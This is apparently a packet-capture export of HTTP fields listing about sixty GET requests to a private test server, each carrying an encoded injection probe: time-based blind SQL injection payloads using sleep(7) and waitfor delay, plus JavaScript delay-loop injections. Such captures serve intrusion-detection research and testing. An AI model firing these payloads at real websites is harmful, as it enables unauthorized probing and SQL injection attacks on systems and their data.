http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									681						1	http://192.168.1.102/web/?%27%3Bd%3Dnew+Date%28%29%3Bdo%7Bcd%3Dnew+Date%28%29%3B%7Dwhile%28cd-d%3C10000%29%3B%2F%2F		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?%27%3Bd%3Dnew+Date%28%29%3Bdo%7Bcd%3Dnew+Date%28%29%3B%7Dwhile%28cd-d%3C10000%29%3B%2F%2F
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									684						1	http://192.168.1.102/web/?%22%3Bd%3Dnew+Date%28%29%3Bdo%7Bcd%3Dnew+Date%28%29%3B%7Dwhile%28cd-d%3C10000%29%3B%2F%2F		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?%22%3Bd%3Dnew+Date%28%29%3Bdo%7Bcd%3Dnew+Date%28%29%3B%7Dwhile%28cd-d%3C10000%29%3B%2F%2F
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									687						1	http://192.168.1.102/web/?s=sleep%287%29%231		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=sleep%287%29%231
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									690						1	http://192.168.1.102/web/?s=sleep%287%29%23%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=sleep%287%29%23%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									693						1	http://192.168.1.102/web/?s=%2Csleep%287%29%231		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%2Csleep%287%29%231
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									696						1	http://192.168.1.102/web/?s=%60%2Csleep%287%29%231		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%60%2Csleep%287%29%231
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									699						1	http://192.168.1.102/web/?s=1+or+sleep%287%29%231		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=1+or+sleep%287%29%231
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									702						1	http://192.168.1.102/web/?s=1+or+sleep%287%29%23%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=1+or+sleep%287%29%23%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									705						1	http://192.168.1.102/web/?s=%22+or+sleep%287%29%231		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%22+or+sleep%287%29%231
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									708						1	http://192.168.1.102/web/?s=%22+or+sleep%287%29%23%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%22+or+sleep%287%29%23%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									711						1	http://192.168.1.102/web/?s=%27+or+sleep%287%29%231		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%27+or+sleep%287%29%231
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									714						1	http://192.168.1.102/web/?s=%27+or+sleep%287%29%23%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%27+or+sleep%287%29%23%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									717						1	http://192.168.1.102/web/?s=%22+or+sleep%287%29%3D%22		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%22+or+sleep%287%29%3D%22
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									720						1	http://192.168.1.102/web/?s=%27+or+sleep%287%29%3D%27		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%27+or+sleep%287%29%3D%27
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									723						1	http://192.168.1.102/web/?s=1%29+or+sleep%287%29%231		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=1%29+or+sleep%287%29%231
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									726						1	http://192.168.1.102/web/?s=1%29+or+sleep%287%29%23%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=1%29+or+sleep%287%29%23%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									729						1	http://192.168.1.102/web/?s=%22%29+or+sleep%287%29%3D%22		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%22%29+or+sleep%287%29%3D%22
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									732						1	http://192.168.1.102/web/?s=%27%29+or+sleep%287%29%3D%27		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%27%29+or+sleep%287%29%3D%27
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									735						1	http://192.168.1.102/web/?s=1%29%29+or+sleep%287%29%231		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=1%29%29+or+sleep%287%29%231
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									738						1	http://192.168.1.102/web/?s=1%29%29+or+sleep%287%29%23%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=1%29%29+or+sleep%287%29%23%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									741						1	http://192.168.1.102/web/?s=%22%29%29+or+sleep%287%29%3D%22		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%22%29%29+or+sleep%287%29%3D%22
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									744						1	http://192.168.1.102/web/?s=%27%29%29+or+sleep%287%29%3D%27		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%27%29%29+or+sleep%287%29%3D%27
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									747						1	http://192.168.1.102/web/?s=1+and+sleep%287%29%231		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=1+and+sleep%287%29%231
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									750						1	http://192.168.1.102/web/?s=1+and+sleep%287%29%23%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=1+and+sleep%287%29%23%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									753						1	http://192.168.1.102/web/?s=%22+and+sleep%287%29%231		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%22+and+sleep%287%29%231
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									756						1	http://192.168.1.102/web/?s=%22+and+sleep%287%29%23%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%22+and+sleep%287%29%23%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									759						1	http://192.168.1.102/web/?s=%27+and+sleep%287%29%231		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%27+and+sleep%287%29%231
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									762						1	http://192.168.1.102/web/?s=%27+and+sleep%287%29%23%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%27+and+sleep%287%29%23%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									765						1	http://192.168.1.102/web/?s=%22+and+sleep%287%29%3D%22		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%22+and+sleep%287%29%3D%22
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									768						1	http://192.168.1.102/web/?s=%27+and+sleep%287%29%3D%27		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%27+and+sleep%287%29%3D%27
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									771						1	http://192.168.1.102/web/?s=1%29+and+sleep%287%29%231		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=1%29+and+sleep%287%29%231
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									774						1	http://192.168.1.102/web/?s=1%29+and+sleep%287%29%23%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=1%29+and+sleep%287%29%23%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									777						1	http://192.168.1.102/web/?s=%22%29+and+sleep%287%29%3D%22		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%22%29+and+sleep%287%29%3D%22
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									780						1	http://192.168.1.102/web/?s=%27%29+and+sleep%287%29%3D%27		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%27%29+and+sleep%287%29%3D%27
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									783						1	http://192.168.1.102/web/?s=1%29%29+and+sleep%287%29%231		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=1%29%29+and+sleep%287%29%231
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									786						1	http://192.168.1.102/web/?s=1%29%29+and+sleep%287%29%23%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=1%29%29+and+sleep%287%29%23%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									789						1	http://192.168.1.102/web/?s=%22%29%29+and+sleep%287%29%3D%22		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%22%29%29+and+sleep%287%29%3D%22
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									792						1	http://192.168.1.102/web/?s=%27%29%29+and+sleep%287%29%3D%27		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%27%29%29+and+sleep%287%29%3D%27
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									795						1	http://192.168.1.102/web/?s=%3Bwaitfor+delay+%270%3A0%3A7%27--1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%3Bwaitfor+delay+%270%3A0%3A7%27--1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									798						1	http://192.168.1.102/web/?s=%3Bwaitfor+delay+%270%3A0%3A7%27--1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%3Bwaitfor+delay+%270%3A0%3A7%27--1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									801						1	http://192.168.1.102/web/?s=+waitfor+delay+%270%3A0%3A7%27--1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=+waitfor+delay+%270%3A0%3A7%27--1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									804						1	http://192.168.1.102/web/?s=%3Bwaitfor+delay+%270%3A0%3A7%27--%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%3Bwaitfor+delay+%270%3A0%3A7%27--%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									807						1	http://192.168.1.102/web/?s=%29%3Bwaitfor+delay+%270%3A0%3A7%27--1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%29%3Bwaitfor+delay+%270%3A0%3A7%27--1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									810						1	http://192.168.1.102/web/?s=%29%3Bwaitfor+delay+%270%3A0%3A7%27--1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%29%3Bwaitfor+delay+%270%3A0%3A7%27--1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									813						1	http://192.168.1.102/web/?s=%29%3Bwaitfor+delay+%270%3A0%3A7%27--%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%29%3Bwaitfor+delay+%270%3A0%3A7%27--%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									816						1	http://192.168.1.102/web/?s=%27%3Bwaitfor+delay+%270%3A0%3A7%27--1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%27%3Bwaitfor+delay+%270%3A0%3A7%27--1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									819						1	http://192.168.1.102/web/?s=%27%3Bwaitfor+delay+%270%3A0%3A7%27--%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%27%3Bwaitfor+delay+%270%3A0%3A7%27--%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									822						1	http://192.168.1.102/web/?s=%22%3Bwaitfor+delay+%270%3A0%3A7%27--1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%22%3Bwaitfor+delay+%270%3A0%3A7%27--1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									825						1	http://192.168.1.102/web/?s=%22%3Bwaitfor+delay+%270%3A0%3A7%27--%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%22%3Bwaitfor+delay+%270%3A0%3A7%27--%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									828						1	http://192.168.1.102/web/?s=%27%29%3Bwaitfor+delay+%270%3A0%3A7%27--1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%27%29%3Bwaitfor+delay+%270%3A0%3A7%27--1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									831						1	http://192.168.1.102/web/?s=%27%29%3Bwaitfor+delay+%270%3A0%3A7%27--%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%27%29%3Bwaitfor+delay+%270%3A0%3A7%27--%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									834						1	http://192.168.1.102/web/?s=%22%29%3Bwaitfor+delay+%270%3A0%3A7%27--1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%22%29%3Bwaitfor+delay+%270%3A0%3A7%27--1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									837						1	http://192.168.1.102/web/?s=%22%29%3Bwaitfor+delay+%270%3A0%3A7%27--%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%22%29%3Bwaitfor+delay+%270%3A0%3A7%27--%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									840						1	http://192.168.1.102/web/?s=%29%29%3Bwaitfor+delay+%270%3A0%3A7%27--1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%29%29%3Bwaitfor+delay+%270%3A0%3A7%27--1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									843						1	http://192.168.1.102/web/?s=%29%29%3Bwaitfor+delay+%270%3A0%3A7%27--1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%29%29%3Bwaitfor+delay+%270%3A0%3A7%27--1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									846						1	http://192.168.1.102/web/?s=%29%29%3Bwaitfor+delay+%270%3A0%3A7%27--%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%29%29%3Bwaitfor+delay+%270%3A0%3A7%27--%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									849						1	http://192.168.1.102/web/?s=%27%29%29%3Bwaitfor+delay+%270%3A0%3A7%27--1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%27%29%29%3Bwaitfor+delay+%270%3A0%3A7%27--1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									852						1	http://192.168.1.102/web/?s=%27%29%29%3Bwaitfor+delay+%270%3A0%3A7%27--%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%27%29%29%3Bwaitfor+delay+%270%3A0%3A7%27--%0A1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									855						1	http://192.168.1.102/web/?s=%22%29%29%3Bwaitfor+delay+%270%3A0%3A7%27--1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%22%29%29%3Bwaitfor+delay+%270%3A0%3A7%27--1
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									858						1	http://192.168.1.102/web/?s=%22%29%29%3Bwaitfor+delay+%270%3A0%3A7%27--%0A1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0				/web/?s=%22%29%29%3Bwaitfor+delay+%270%3A0%3A7%27--%0A1
